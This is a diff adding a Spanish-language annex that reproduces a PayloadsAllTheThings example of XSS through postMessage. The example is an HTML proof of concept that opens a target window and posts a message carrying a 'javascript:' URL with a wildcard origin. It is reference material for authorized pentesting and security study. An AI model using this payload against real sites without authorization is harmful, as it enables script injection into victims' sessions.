@@ -1,0 +1,36 @@
+# Vulnerabilidades de postMessage: anexo de ejemplos de PayloadsAllTheThings
+
+> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.
+
+**Documento de origen:** [XSS Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XSS%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).
+
+[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)
+
+## 1. XSS / XSS in PostMessage
+
+```html
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    window.poc = window.open('http://10.10.10.10/#login');
+    setTimeout(function(){
+        window.poc.postMessage(
+            {
+                "sender": "accounts",
+                "url": "javascript:confirm('XSS')",
+            },
+            '*'
+        );
+    }, 2000);
+}
+</script>
+</html>
+```
+
+---
+
+[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
